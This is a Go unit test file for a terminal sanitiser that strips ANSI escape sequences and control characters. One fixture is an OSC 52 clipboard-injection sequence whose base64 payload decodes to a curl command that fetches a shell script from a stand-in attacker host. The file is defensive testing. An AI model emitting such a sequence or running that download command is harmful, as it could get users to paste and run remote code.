package tui_v1

import (
	"testing"
)

func TestStripControlChars(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "OSC 52 clipboard injection",
			input: "normal text\x1b]52;c;Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2gK\x07more text",
			want:  "normal textmore text",
		},
		{
			name:  "CSI cursor movement",
			input: "visible\x1b[Hhidden\x1b[2Jtext",
			want:  "visiblehiddentext",
		},
		{
			name:  "SGR color codes",
			input: "\x1b[31mRED\x1b[0m normal",
			want:  "RED normal",
		},
		{
			name:  "C0 controls except newline and tab",
			input: "text\x00\x01\x02with\nnewline\tand tab",
			want:  "textwith\nnewline\tand tab",
		},
		{
			name:  "DEL character",
			input: "text\x7fmore",
			want:  "textmore",
		},
		{
			name:  "C1 controls",
			input: "text\xc2\x80\xc2\x9fmore",
			want:  "textmore",
		},
		{
			name:  "normal text unchanged",
			input: "Hello, world! 123",
			want:  "Hello, world! 123",
		},
		{
			name:  "unicode preserved",
			input: "こんにちは 🎉",
			want:  "こんにちは 🎉",
		},
		{
			name:  "empty string",
			input: "",
			want:  "",
		},
		{
			name:  "only escape sequences",
			input: "\x1b[31m\x1b[0m",
			want:  "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := StripControlChars(tt.input)
			if got != tt.want {
				t.Errorf("StripControlChars() = %q, want %q", got, tt.want)
			}
		})
	}
}
